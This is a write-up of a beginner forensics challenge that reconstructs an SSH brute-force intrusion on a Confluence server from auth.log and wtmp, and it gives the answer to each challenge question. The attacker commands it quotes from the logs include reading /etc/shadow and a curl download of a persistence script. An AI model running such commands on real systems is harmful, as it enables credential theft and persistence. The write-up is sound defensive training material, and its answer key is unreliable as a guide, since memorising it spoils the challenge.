# Scenario
This is a very easy Sherlock, in which we familiarize with Unix `auth.log` and `wtmp logs`. 
We'll explore a scenario where a Confluence server **was brute-forced via its SSH service**. The `auth.log` file is essential for the brute-forced attack analysis and to **track the additional activities performed by the attacker** after gaining access to the server, we'll delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
## Skills Learnt

- UNIX log analysis
- wtmp analysis
- BruteForce activity analysis
- Timeline creation
- Contextual Analysis
- Post Exploitation Analysis

## Initial Analysis
We have been provided with two artifacts, the Linux authentication logs and the WTMP output. Lets kick off with a brief explanation of those files.
### auth.log
This file is used for track any action that requires authentication.  Tasks like log in, switch user and others will generate an entry in this log file. This include activities involving `sshd`, `sudo` actions, and `cron` jobs requiring authentication.
#### Fields in auth.log
Entries in `auth.log` typically include the following fields:

- **Date and Time**: The timestamp when the event occurred.
- **Hostname**: The name of the system on which  the event occurred.
- **Service**: The name of the service or daemon reporting the event.
- **PID**: The process ID of the event when was logged.
- **User**: The username involved in the authentication process.
- **Authentication Status**: Details whether the authentication attempt was successful or failed.
- **ID Address/Hostname**: For remote connections, the IP address or hostname of the client attempting to connect.
- **Message**: A detailed message about the event, including any specific error message or codes associated with the authentication attempt.

Below is shows an entry example of a failed password attempt for user named "admin" on exampleserver from a source IP of 192.168.10.101 over port 22 (SSH).

```
Mar 10 10:34:21 exampleserver sshd[19360]: Failed password for invalid user admin from 192.168.10.101 port 22 ssh2
```

### wtmp
The `wtmp` file logs all login and logout events on the system. It's a binary file, **typically located at** `/var/log/wtmp` and present the following information.

- **username**: The name of the user logging in or out.
- **terminal**: The tty device name or terminal 
- **IP address/Hostname**: The IP address or hostname of the user's machine.
- **Login time**: The date and time the user logged in
- **Logout time**: The date and time the user logged out
- **Duration**: Duration of the session

Below is shown an example where the user sebh24 logged in from 192.168.10.101 and the session lasted for a total of 1 minute.

```
sebh24 pts/0 192.168.10.101 Sat Mar 10 10:34:21 - 10:35 (00:01)
```

As told before, `wtmp` is a binary file so we use different tools suhc as `last` or `utmpdump`, in this case we have a tool called `utmp.py` to aid the investigation.

# Questions
---
1. **Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**

To identify potential brute force attacks, we look for multiple occurrences of log entries containing `"Invalid user"` or `"Failed password"` within a short time frame. These messages typically indicate repeated unauthorized login attempts.

To extract this information from the log file, I used the `cat` and `grep` commands as follows. 
	
```sh
cat auth.log | grep -iE "invalid|failed"
```

The key component of this command is `grep`, used with the following options:
	
- `-i`: Makes the search case-insensitive, so it matches both uppercase and lowercase variations.
    
- `-E`: Enables extended regular expressions, allowing us to search for multiple patterns in a single command. In this case, it matches lines containing either `"invalid"` or `"failed"`.
    
This command filters the contents of the `auth.log` file and displays only the lines relevant to failed authentication attempts. Below are the results retrieved from running this command.

![image](https://github.com/user-attachments/assets/9d10ef13-8c4a-4e8d-a6e2-54a436e131e3)

According to the results above we can see a numerous attempts from a single IP address, `65.2.161.68`, indicating a brute force attack. 
	
**ANSWER: `65.2.161.68`**

2. **The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**

We have confirmed the IP address performing a bruteforce attack, however we need to know if the threat actor was successful, so we search for the keyword "Accepted password" using the same command combination.

```sh
cat auth.log | grep -i "accepted"
```

This command displays only the lines with the password accepted in the authentication process as shows below.
	
![image](https://github.com/user-attachments/assets/26525e8d-ede7-4466-a4f3-a3cfabff136c)
	
As we can see the first time the attack was successful the attacker **access as `root`** . Indicating that the **most privilege user of the system was compromised**, this is critical for any system. Also we see another connection with other user (cyberjunkie) 

![image](https://github.com/user-attachments/assets/b33bf8df-6861-4e3b-930f-c23440e06080)

It is also shows that the **session was closed at the same time it was accepted**, which further **indicated a brute forcing tool being used**. A brute forcing tool is a program or script designed to systematically attempt all possible combination of characters to find a correct solution, typically used in password cracking or cryptography context.
	
Some examples of brute forcing tools for authentication are:
- Hydra
- Medusa
- Brutus

**ANSWER: `root`**

3. **Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**

Initially the attacker used automated tools for the brute force attack, but after obtain the correct credentials, they authenticated manually and enter the system at 06:32:44 as we can see below.
	
![image](https://github.com/user-attachments/assets/9d49063b-8239-433e-8579-a35142406528)

Although we know the connection happened at that time for this specific analysis we will use wtmp artifact as this will provide us the time when the attacker had an interactive terminal connected. So first we used the tool `utmp.py` to created a readable file as shown below

```sh
python3 utmp.py -o wtmp.out wtmp
```

With the readable file we can filter the information using `grep` with the IP of the attacker `65.2.161.68` in order to obtain the timestamp when the attacker established a terminal session. 
	
![image](https://github.com/user-attachments/assets/6a56a5d3-036f-4408-8997-e261a1cf62c0)

We see that the attacker established a terminal session as root at 06:32:45 on 2024-03-06.

**ANSWER: `2024-03-06 06:32:45`**

4. **SSH Login session are tracked and assigned a session number upon logon. What is attacker's session number for the user account from Question 2?**

Each SSH login session is assigned a unique session number for tracking  purposes, we can find it searching the keywords `New session`, and we know which one it is by the user used and the timestamp as displays below.
	 
![image](https://github.com/user-attachments/assets/87e1daf2-da11-481c-8a18-abc7d6734a6c)

**ANSWER: `37`**

5. **The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**

Attackers often create new user accounts for persistence. With this attackers maintain the access or control over the compromised system for an extended period of time, even after initial access has been achieved. 
	
In order to check this we look the keywords `useradd`, `usermod`, and `groupadd` within the auth.log file.
	
- useradd -> Indicates the creation of a new user.
- usermod -> Indicates the modification of the user permissions or groups
- groupadd -> Indicates the creation of a new group.

![image](https://github.com/user-attachments/assets/a7e52a32-d9f0-4a94-ab90-fe0a092b2d22)

The information displayed shows the creation of a new group and user named `cyberjunkie`, who subsequently added to the `sudo` group for elevated privileges. In this way the user created by the attacker can execute commands with elevated privileges by prefixing the command with `sudo`. 

The term "sudo" stands for "superuser do" and **allows authorized users to execute specific commands as the root temporarily**.

 **ANSWER: `cyberjunkie`**

6. **What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**

The MITRE ATT&CK is a **framework that categorizes various tactics and techniques used by attackers**. In this case we understand that the new account created as a method of achieving persistence, so using the *Enterprise Matrix* and locate under "Persistence" the "Create Account" technique, detailed below as T1136

![image](https://github.com/user-attachments/assets/539bfb56-604d-4143-9b11-83f8e80c2d5a)

Let's go little deeper, looking at the sub-techniques. In this case the account was a local account on the compromised host therefore the sub-technique is T1136.001 as shows below.

![image](https://github.com/user-attachments/assets/a4f2fc2a-337f-48c1-966d-62f1b7f71cc3)

**ANSWER: `T1136.001`**

7. **What time did the attacker's first SSH session end according to auth.log?**

In question 4 we found the **session ID was 37**. With this information we can search when the session 37 was closed, in this case at 06:37:24, as we can see in the following image.

![image](https://github.com/user-attachments/assets/63247ce8-238d-48ce-aa0c-6f47ad81fe17)

**ANSWER: `2024-03-06 06:37:24`**

8. **The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**

Even though `auth.log` isn't primarily used to track command execution, commands run with `sudo` are logged since they require authentication. In the filter information we see two execution with sudo.

![image](https://github.com/user-attachments/assets/8e5a3aae-d8e0-4bce-aa10-e8677a64a4ff)

The first used of `sudo` was to view the content of the file `shadow` which **contains the hashes of the passwords of the users of the system**, so the system passwords could have been compromised. The full command was: `sudo cat /etc/shadow`
	
The other executed command download a script form GitHub repository. The full command was: `curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`.  This action indicates the attacker's intention to deploy additional tools or malware for further exploitation or persistence. 

**ANSWER: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`**

# Incident Response
Briefly summarizing the incident, the system was compromised by a brute force attack from IP 65.2.161.68 using tools like hydra or brutus. The attacker access the system as root, created a new user called cyberjunkie and execute commands using sudo.

Once the analysis is done, we can respond to the incident follow the following series of steps:

1. Isolate the system from the network to prevent further damage or spread.
2. Block or remove compromised accounts.
3. Delete the account created by the attacker (cyberjunkie)
4. Delete the malicious script
5. Restore the system from a secure backup
6. Change all system passwords because the were compromised when the attacker read the shadow file, which contained the password hashes.
7. Apply MFA if possible
8. Configure an IDS system and conduct periodic security audits.
